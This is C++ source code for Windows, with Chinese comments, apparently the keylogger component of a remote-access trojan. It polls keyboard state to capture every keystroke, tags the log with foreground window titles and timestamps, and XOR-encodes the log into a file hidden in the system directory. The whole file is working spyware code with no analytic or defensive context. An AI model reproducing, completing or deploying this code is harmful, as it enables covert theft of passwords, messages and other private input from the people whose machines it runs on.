
extern TCHAR UpGroup[50];       //分组
void SaveToFile(CHAR *lpBuffer)
{

	CHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));


	//随机
	char	*lpTime = UpGroup/*(char *)FindConfigString(CKeyboardManager::g_hInstance, "XXXXXX")*/;//防止分组和别人重复
//	lpTime=lpTime+6;
	strcat(strRecordFile,"\\");
	strcat(strRecordFile,(char *)lpTime);
	strcat(strRecordFile,".key");

//	lstrcat(strRecordFile, "\\keyboar.dat");
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ 98;
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
    return;
}
char *LowerCase[]={
 //   	"b",
//	    "e",
 		"[Enter]",
		"[ESC]",
		"[F1]",
		"[F2]",
		"[F3]",
		"[F4]",
		"[F5]",
		"[F6]",
		"[F7]",   //10
		"[F8]",
		"[F9]",
		"[F10]",
		"[F11]",
		"[F12]",
		"`",
		"1",
		"2",
		"3",
		"4",      //20
		"5",
		"6",
		"7",
		"8",
		"9",
		"0",
		"-",
		"=",
		"[TAB]",
		"q",        //30
		"w",
		"e",
		"r",
		"t",
		"y",
		"u",
		"i",
		"o",
		"p",
		"[",   //40
		"]",
		"a",
		"s",
		"d",
		"f",
		"g",
		"h",
		"j",
		"k",
		"l",    //50
		";",
		"'",
		"z",
		"x",
		"c",
		"v",
		"b",
		"n",
		"m",
		",",   //60
		".",
		"/",
		"\\",
		"[CTRL]",
		"[WIN]",
		"[空格]",
		"[WIN]",
		"[Print Screen]",
		"[Scroll Lock]",
		"[Insert]",    //70
		"[Home]",
		"[PageUp]",//
//		"[Del]",
        "[Delete]",
		"[End]",
		"[PageDown]",//
		"[Left]",
		"[UP]",
		"[Right]",
		"[Down]",
		"[Num Lock]",   //80
		"/",
		"*",
		"-",
		"+",
		"0",
		"1",
		"2",
		"3",
		"4",
		"5",        //90
		"6",
		"7",
		"8",
		"9",
		".",
		"[INSERT]",
		"[DELETE]",
		"[BACKSPACE]",
		"[CLEAR]",     //99
    	"[Alt]",     //100
		"[Shift]",     //101
		"[Pause Break]",     //102
};

char *UpperCase[]={
//	    "b",
//		"e",
 		"[Enter]",
		"[ESC]",
		"[F1]",
		"[F2]",
		"[F3]",
		"[F4]",
		"[F5]",
		"[F6]",
		"[F7]",  //10
		"[F8]",
		"[F9]",
		"[F10]",
		"[F11]",
		"[F12]",
		"~",
		"!",
		"@",
		"#",
		"$",   //20
		"%",
		"^",
		"&",
		"*",
		"(",
		")",
		"_",
		"+",
		"[TAB]",
		"Q",         //30
		"W", 
		"E",
		"R",
		"T",
		"Y",
		"U",
		"I",
		"O",
		"P",
		"{",      //40
		"}",
		"A",
		"S",
		"D",
		"F",
		"G",
		"H",
		"J",
		"K",
		"L",      //50
		":",
		"\"",
		"Z",
		"X",
		"C",
		"V",
		"B",
		"N",
		"M",
		"<",   //60
		">",
		"?",
		"│",
		"[CTRL]",
		"[WIN]",
		"[空格]",
		"[WIN]",
		"[Print Screen]",
		"[Scroll Lock]",
		"[Insert]",     //70
		"[Home]",
		"[PageUp]",//
	//	"[Del]",
        "[Delete]",
		"[End]",
		"[PageDown]",//
		"[Left]",
		"[Up]",
		"[Right]",
		"[Down]",
		"[Num Lock]",  //80
		"/",
		"*",
		"-",
		"+",
		"0",
		"1",
		"2",
		"3",
		"4",
		"5",     //90
		"6",
		"7",
		"8",
		"9",
		".",
		"[INSERT]",
		"[DELETE]",
		"[BACKSPACE]",
		"[CLEAR]",     //99
		"[Alt]",     //100
		"[Shift]",     //101
		"[Pause Break]",     //102
};

int SpecialKeys[]={
//	    8,
		13,
		27,
		112,
		113,
		114,
		115,
		116,
		117,
		118,  //10
		119,
		120,
		121,
		122,
		123,
		192,
		49,
		50,
		51,
		52,   //20
		53,
		54,
		55,
		56,
		57,
		48,
		189,
		187,
		9,
		81,   //30
		87,
		69,
		82,
		84,
		89,
		85,
		73,
		79,
		80,
		219,  //40
		221,
		65,
		83,
		68,
		70,
		71,
		72,
		74,
		75,
		76,   //50
		186,
		222,
		90,
		88,
		67,
		86,
		66,
		78,
		77,
		188,   //60
		190,
		191,
		220,
		17,
		91,
		32,
		92,
		44,
		145,
		45,    //70
		36,
		33,//
		46,
		35,
		34,//
		37,
		38,
		39,
		40,
		144,   //80
		111,
		106,
		109,
		107,
		96,
		97,
		98,
		99,
		100,
		101,   //90
		102,
		103,
		104,
		105,
		110,
		46,
		45,
		8,
		12,   //99
		18,   //100 
		16,   //101
		19,   //102  //因为少了最前面的一个 所以是101
};

HWND PreviousFocus=NULL;
CHAR WindowCaption[1024]={0};
HWND hFocus = NULL;
BOOL IsWindowsFocusChange()
{
	
//	memset(hFocus,0,sizeof(hFocus));



	memset(WindowCaption,0,sizeof(WindowCaption));
	hFocus = GetForegroundWindow(); 
	GetWindowText(hFocus,WindowCaption,sizeof(WindowCaption));


	BOOL ReturnFlag = FALSE; 
	CHAR temp[1024]={0};
	if (hFocus == PreviousFocus) 
	{	 

	}
	else
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;  
			GetLocalTime(&s);  
			wsprintf(temp,"\r\n[标题:]%s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n",WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
			SaveToFile(temp);
			memset(temp,0,sizeof(temp));
			memset(WindowCaption,0,sizeof(WindowCaption)); 
			ReturnFlag=TRUE; 
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag; 
}

//定义一个变量 防止键盘记录开启2个监听线程

BOOL KeyStary = TRUE;

DWORD WINAPI KeyLogger(LPARAM lparam)
{
	if (KeyStary == FALSE)
	{
//	MessageBox(NULL,NULL,NULL,NULL);
	return 0;
	}

	KeyStary = FALSE;

	int bKstate[256] = {0}; 
	int i,x;
	CHAR KeyBuffer[600] = {0}; 
	int state; 
	int shift; 
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	
	while(TRUE)
	{
		Sleep(10); 
		if (lstrlen(KeyBuffer) != 0) 
		{
			if (IsWindowsFocusChange())
			{
			//	lstrcat(KeyBuffer,"\r\n");
			//	lstrcat(KeyBuffer,"\n"); //注释掉解决复制粘贴乱码
				SaveToFile("[内容:]");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
			else
			{
			//	lstrcat(KeyBuffer,"\n");//注释掉解决复制粘贴乱码
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));

			}
		}
		       
		        //94
		for(i=0;i<101;i++) 
		{
			shift = GetKeyState(VK_SHIFT); 
			x = SpecialKeys[ i ]; 
			if (GetAsyncKeyState(x) & 0x8000) 
			{
				                                                                      //93
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1; 
				}
				else                                                                     //93
					if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2; 
					}
					else
						if (shift < 0) 
						{
							bKstate[x] = 3; 
						}
						else
							bKstate[x] = 4; 
			}
			else
			{
				if (bKstate[x] != 0) 
				{
					state = bKstate[x]; 
					bKstate[x] = 0;
					if (x == 8) //退键
					{
// 						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
// 						continue;
						lstrcat(KeyBuffer,"<BackSpace>");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer,0,sizeof(KeyBuffer)); 
						continue; 

					}
					else
						if (lstrlen(KeyBuffer) > 550) 
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer,0,sizeof(KeyBuffer)); 
							continue;
						}
						else
							if (x == 13) //回车
							{
								/*if (lstrlen(KeyBuffer) == 0) 
								{
									continue; 
								}*///不去掉的话 Enter无法记录
								lstrcat(KeyBuffer,"<Enter>\r\n");//自动换行
								SaveToFile(KeyBuffer);
								memset(KeyBuffer,0,sizeof(KeyBuffer)); 
								continue; 
							}
							else
							{
								if ((state%2) == 1) 
								{
									lstrcat(KeyBuffer,(CHAR *)UpperCase[ i ]);
	
								}
								else
									if ((state%2) == 0) 
									{
										lstrcat(KeyBuffer,(CHAR *)LowerCase[ i ]); 
								

									}
							}
				}
			}
		}
	}
	return 0; 
}
